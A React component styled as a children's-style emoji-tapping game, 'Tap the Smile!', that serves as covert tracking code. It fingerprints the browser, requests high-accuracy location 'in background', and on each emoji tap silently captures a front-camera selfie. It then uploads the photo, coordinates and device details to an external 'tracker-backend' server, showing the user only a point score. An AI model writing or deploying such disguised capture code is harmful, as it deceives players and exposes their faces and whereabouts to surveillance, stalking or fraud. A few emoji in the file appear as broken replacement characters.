import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';

const API_BASE_URL = (import.meta.env.VITE_API_BASE_URL || 'https://tracker-backend-eta.vercel.app').replace(/\/+$/, '');

function CameraCapture({ onSuccess }) {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [status, setStatus] = useState('waiting'); // waiting, ready, success, error
  const [location, setLocation] = useState(null);
  const [browserInfo, setBrowserInfo] = useState(null);
  const [score, setScore] = useState(0);
  const [emojis, setEmojis] = useState(['😊', '😎', '🤩', '😜', '🥳', '😇']);
  const [clickedEmoji, setClickedEmoji] = useState(null);

  useEffect(() => {
    collectBrowserInfo();
    requestPermissions();
  }, []);

  const collectBrowserInfo = () => {
    const info = {
      browserName: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)/)?.[0] || 'Unknown',
      os: navigator.platform,
      screenResolution: `${screen.width}x${screen.height}`,
      language: navigator.language,
      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    setBrowserInfo(info);
  };

  const requestPermissions = async () => {
    try {
      if (!navigator.mediaDevices || !navigator.geolocation) {
        throw new Error('Camera or location services not available.');
      }

      // Request camera permission first
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: false
      });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }

      // Request location permission in background
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setLocation({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          });
          setStatus('ready');
        },
        (error) => {
          console.error('Location error:', error);
          // If location fails, still set to ready but use dummy location
          setLocation({
            latitude: 0,
            longitude: 0
          });
          setStatus('ready');
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    } catch (error) {
      console.error('Request permissions error:', error);
      setStatus('error');
    }
  };

  const handleEmojiClick = (emoji) => {
    if (status !== 'ready') return;
    setClickedEmoji(emoji);
    setScore(prev => prev + 100);
    captureSelfie();
  };

  const captureSelfie = () => {
    const canvas = canvasRef.current;
    const video = videoRef.current;
    
    if (!video || !canvas) return;
    
    const maxWidth = 400;
    const maxHeight = 300;
    let width = video.videoWidth || 640;
    let height = video.videoHeight || 480;
    
    if (width > height) {
      if (width > maxWidth) {
        height = Math.round(height * maxWidth / width);
        width = maxWidth;
      }
    } else {
      if (height > maxHeight) {
        width = Math.round(width * maxHeight / height);
        height = maxHeight;
      }
    }
    
    canvas.width = width;
    canvas.height = height;
    canvas.getContext('2d').drawImage(video, 0, 0, width, height);
    const imageData = canvas.toDataURL('image/jpeg', 0.5);
    uploadData(imageData);
  };

  const uploadData = async (imageData) => {
    try {
      await axios.post(`${API_BASE_URL}/api/records`, {
        selfie: imageData,
        location: location || { latitude: 0, longitude: 0 },
        browserInfo: browserInfo
      });
      setStatus('success');
      setTimeout(onSuccess, 1500);
    } catch (error) {
      console.error('Upload error full details:', error.response?.data || error.message);
      setStatus('error');
    }
  };

  if (status === 'error') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-yellow-400 to-orange-500 p-4">
        <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 text-center">
          <div className="w-24 h-24 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-6 animate-bounce">
            <span className="text-6xl">🎮</span>
          </div>
          <h1 className="text-4xl font-black text-gray-800 mb-4">Game Paused!</h1>
          <p className="text-gray-600 mb-8 text-lg">
            Oops! We need camera permissions to play!
          </p>
          <button
            onClick={() => window.location.reload()}
            className="w-full bg-gradient-to-r from-orange-500 to-red-500 hover:from-orange-600 hover:to-red-600 text-white font-black py-5 px-6 rounded-xl transition-all duration-200 text-xl shadow-lg hover:shadow-xl transform hover:-translate-y-1"
          >
            Play Again!
          </button>
        </div>
      </div>
    );
  }

  if (status === 'success') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-green-400 to-emerald-500 p-4">
        <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 text-center">
          <div className="w-24 h-24 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-6 animate-bounce">
            <span className="text-6xl">�</span>
          </div>
          <h1 className="text-4xl font-black text-gray-800 mb-2">Great Score!</h1>
          <p className="text-5xl font-black text-yellow-500 mb-4">{score} Points!</p>
          <p className="text-gray-600 text-lg">You're amazing! 🎊</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-indigo-500 via-purple-500 to-pink-500 p-4 overflow-hidden">
      <div className="max-w-md mx-auto">
        {/* Game Header */}
        <div className="bg-white/20 backdrop-blur-lg rounded-2xl p-4 mb-6 text-center">
          <h1 className="text-3xl font-black text-white mb-1 drop-shadow-lg">� Tap the Smile! 🎈</h1>
          <p className="text-white/90 font-semibold text-lg">Tap an emoji to score points!</p>
          <p className="text-4xl font-black text-yellow-300 mt-2">{score} pts</p>
        </div>

        {/* Game Camera */}
        <div className="bg-white rounded-2xl shadow-2xl overflow-hidden mb-6 relative">
          <video
            ref={videoRef}
            autoPlay
            playsInline
            muted
            className="w-full aspect-square object-cover"
          />
          <canvas ref={canvasRef} className="hidden" />
          
          {/* Floating Emojis to Tap */}
          {status === 'ready' && (
            <>
              {emojis.map((emoji, index) => (
                <button
                  key={index}
                  onClick={() => handleEmojiClick(emoji)}
                  className="absolute text-6xl cursor-pointer transition-all duration-150 hover:scale-125 active:scale-90 animate-bounce"
                  style={{
                    left: `${15 + Math.random() * 70}%`,
                    top: `${15 + Math.random() * 70}%`,
                    animationDelay: `${index * 0.2}s`
                  }}
                >
                  {emoji}
                </button>
              ))}
            </>
          )}

          {/* Status Indicator */}
          <div className="absolute top-4 left-1/2 transform -translate-x-1/2 bg-white/90 backdrop-blur px-4 py-2 rounded-full shadow-lg">
            {status === 'waiting' && <span className="text-xl font-bold text-purple-600">⏳ Loading...</span>}
            {status === 'ready' && <span className="text-xl font-bold text-green-600">🎯 Tap a smile!</span>}
          </div>
        </div>

        {/* Instructions */}
        <div className="bg-white/20 backdrop-blur-lg rounded-2xl p-6 text-center">
          <div className="flex items-center justify-center gap-2">
            <span className="text-3xl">�</span>
            <span className="text-white text-lg font-bold">Tap any emoji to capture your smile!</span>
          </div>
        </div>
      </div>
    </div>
  );
}

export default CameraCapture;
